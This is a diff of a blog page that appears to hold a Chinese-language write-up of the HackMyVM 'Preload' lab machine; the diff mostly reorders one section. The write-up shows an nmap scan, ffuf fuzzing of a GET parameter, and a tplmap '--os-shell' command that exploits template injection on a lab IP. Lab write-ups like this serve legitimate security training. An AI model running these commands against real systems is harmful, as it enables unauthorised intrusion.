@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="Machines Name：Hackmyvm - Preload Difficulty：easy  nmap 1nmap -T4 -A -sS -vv -Pn 192.168.56.14    首页源代码href指向?multiply&#x3D;7*7，推测可能是服务器模版注入(SSTI)  5000端口无响应  50000端口网络错误  SSTI 服务器模版注入  ffuf GET参数1ffuf">
+    <meta name="description" content="Machines Name：Hackmyvm - Preload Difficulty：easy  nmap 1nmap -T4 -A -sS -vv -Pn 192.168.56.14    首页源代码href指向?multiply&#x3D;7*7，推测可能是服务器模版注入(SSTI)  5000端口无响应  50000端口网络错误  ffuf GET参数1ffuf -ic -c -w .&#x2F;t">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Hackmyvm - Preload WriteUp">
 <meta property="og:url" content="http://example.com/posts/2515702210/index.html">
 <meta property="og:site_name" content="Brich">
-<meta property="og:description" content="Machines Name：Hackmyvm - Preload Difficulty：easy  nmap 1nmap -T4 -A -sS -vv -Pn 192.168.56.14    首页源代码href指向?multiply&#x3D;7*7，推测可能是服务器模版注入(SSTI)  5000端口无响应  50000端口网络错误  SSTI 服务器模版注入  ffuf GET参数1ffuf">
+<meta property="og:description" content="Machines Name：Hackmyvm - Preload Difficulty：easy  nmap 1nmap -T4 -A -sS -vv -Pn 192.168.56.14    首页源代码href指向?multiply&#x3D;7*7，推测可能是服务器模版注入(SSTI)  5000端口无响应  50000端口网络错误  ffuf GET参数1ffuf -ic -c -w .&#x2F;t">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://hackmyvm.eu/img/m/machine.gif">
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220331145917236.png">
@@ -19,8 +19,8 @@
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220331150023250.png">
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220331150254151.png">
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220331150316173.png">
-<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220331155916749.png">
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220331155723392.png">
+<meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220331155916749.png">
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220331151558666.png">
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220331151648018.png">
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220331151836252.png">
@@ -29,7 +29,7 @@
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220331152119919.png">
 <meta property="og:image" content="https://typro-1304950244.file.myqcloud.com/image-20220331153021084.png">
 <meta property="article:published_time" content="2022-03-24T06:56:49.000Z">
-<meta property="article:modified_time" content="2022-03-31T08:04:41.426Z">
+<meta property="article:modified_time" content="2022-03-31T08:08:57.180Z">
 <meta property="article:author" content="lin">
 <meta property="article:tag" content="Hackmyvm Machines">
 <meta name="twitter:card" content="summary">
@@ -184,12 +184,12 @@
 <p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331150254151.png" alt="image-20220331150254151"></p>
 <p>50000端口网络错误</p>
 <p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331150316173.png" alt="image-20220331150316173"></p>
-<p>SSTI 服务器模版注入</p>
-<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331155916749.png" alt="image-20220331155916749"></p>
 <h2 id="ffuf-GET参数"><a href="#ffuf-GET参数" class="headerlink" title="ffuf GET参数"></a>ffuf GET参数</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -ic -c -w ./test.txt -u <span class="string">&#x27;http://192.168.56.14:50000/?FUZZ=1&#x27;</span> -mc 200</span><br></pre></td></tr></table></figure>
 
 <p>得到get参数为cmd，这里使用大字典fuzz会导致50000端口的服务崩溃掉，所以意思一下吧</p>
 <p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331155723392.png" alt="image-20220331155723392"></p>
+<p>SSTI 服务器模版注入</p>
+<p><img src="https://typro-1304950244.file.myqcloud.com/image-20220331155916749.png" alt="image-20220331155916749"></p>
 <h2 id="SSTI-Getshell"><a href="#SSTI-Getshell" class="headerlink" title="SSTI Getshell"></a>SSTI Getshell</h2><p>使用工具直接打</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./tplmap.py -u <span class="string">&#x27;http://192.168.56.14:50000/?cmd=1*&#x27;</span> --os-shell</span><br></pre></td></tr></table></figure>
 
